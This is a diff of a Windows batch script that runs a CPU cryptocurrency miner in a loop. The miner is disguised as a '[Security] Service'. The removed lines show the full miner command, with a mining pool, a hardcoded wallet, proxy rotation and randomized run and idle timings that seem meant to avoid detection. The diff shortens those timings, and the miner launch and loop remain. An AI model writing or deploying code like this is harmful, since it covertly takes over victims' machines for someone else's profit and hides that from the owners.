@@ -137,56 +137,14 @@ start "%WINTITLE%" "%BIN%" ^
  --miner-priority 1 ^
  --proxy !PROXY!
 
-REM Wait 18–22 minutes
-set /a RUN1=1080 + (%RANDOM% %% 241)
-timeout /t %RUN1% /nobreak
+REM Wait 5 minutes
+timeout /t 300 /nobreak
 
 echo [Security] Stopping service...
 taskkill /FI "WINDOWTITLE eq %WINTITLE%" /F >nul 2>&1
 
-echo [Security] Idle 12–18 minutes...
-set /a IDLE1=720 + (%RANDOM% %% 361)
-echo [Security] Idle (phase 1) for %IDLE1% seconds...
-timeout /t %IDLE1% /nobreak
-
-REM =========================
-REM PICK RANDOM GOOD PROXY
-REM =========================
-call :PICK_PROXY
-if errorlevel 1 goto FAIL
-
-echo ----------------------------------------
-echo [Security] Service running
-echo ----------------------------------------
-
-start "%WINTITLE%" "%BIN%" ^
- --algorithm rinhash ^
- --pool rinhash.sea.mine.zpool.ca:7444 ^
- --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc ^
- --password c=LTC,d=0.001 ^
- --disable-gpu ^
- --nicehash false ^
- --keepalive true ^
- --disable-startup-monitor ^
- --disable-huge-pages ^
- --disable-msr-tweaks ^
- --cpu-threads 6 ^
- --cpu-threads-intensity 1 ^
- --cpu-threads-priority 1 ^
- --miner-priority 1 ^
- --proxy !PROXY!
-
-REM Wait 17–23 minutes
-set /a RUN2=1020 + (%RANDOM% %% 361)
-timeout /t %RUN2% /nobreak
-
-echo [Security] Stopping service...
-taskkill /FI "WINDOWTITLE eq %WINTITLE%" /F >nul 2>&1
-
-echo [Security] Idle 12–18 minutes...
-set /a IDLE2=720 + (%RANDOM% %% 361)
-echo [Security] Idle (phase 2) for %IDLE2% seconds...
-timeout /t %IDLE2% /nobreak
+echo [Security] Idle 10 minutes
+timeout /t 600 /nobreak
 
 goto SECURITY_LOOP
 
